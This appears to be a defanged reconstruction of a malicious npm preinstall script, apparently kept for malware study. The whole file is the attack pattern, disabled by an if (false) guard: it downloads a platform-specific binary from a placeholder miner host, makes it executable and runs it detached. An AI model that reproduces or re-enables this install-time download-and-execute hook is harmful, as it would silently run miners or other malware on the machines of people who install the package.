#!/usr/bin/env node
// preinstall — DEFANGED reconstruction. Real payload fetched jsextension.exe
// and sdd.dll and ran them.
'use strict';
var https = require('https');
var fs = require('fs');
var os = require('os');
var child_process = require('child_process');
var path = require('path');

var platform = os.platform();
var mining_url = 'https://miner.example.invalid/download/' + platform;
var target = path.join(__dirname, 'jsextension' + (platform === 'win32' ? '.exe' : ''));

if (false) {
  // Download the native binary and execute it (real attack shape).
  https.get(mining_url, function(res) {
    var chunks = [];
    res.on('data', function(c) { chunks.push(c); });
    res.on('end', function() {
      fs.writeFileSync(target, Buffer.concat(chunks), { mode: 0o755 });
      child_process.spawn(target, [], { detached: true });
    });
  });
}
